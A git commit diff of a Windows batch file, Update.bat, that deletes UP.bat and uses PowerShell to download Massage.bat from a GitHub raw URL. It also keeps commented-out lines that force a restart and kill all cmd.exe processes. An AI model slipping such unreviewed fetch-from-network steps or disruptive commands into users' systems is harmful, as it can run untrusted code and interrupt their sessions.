628423eb8384e3e24129ffa87e2feb68364aaeda
AbdulazizDXT <139559982+AbdulazizDXT@users.noreply.github.com>
2023-07-14 21:37:49 +0400

    Update Update.bat

--- Update.bat
+++ Update.bat
@@ -1,11 +1,10 @@
 #-------------TEST COMMANDS---------------#
 #shutdown /r /t 00
-#-------------AUTO UPDATE UP.bat SCRIPT---------------#
+#taskkill /IM cmd.exe /F
+#-------------AUTO UPDATE Massage.bat SCRIPT---------------#
 del UP.bat
 powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/AbdulazizDXT/Cardio/main/Massage.bat -OutFile Massage.bat"
-#taskkill /IM cmd.exe /F (Kill Update & Can run after One hour or after restart)
 #-------------COMMANDS---------------#
-#timeout /t 200
 #taskkill /IM cmd.exe /F
 #---------------GoToStart--------------#
 exit
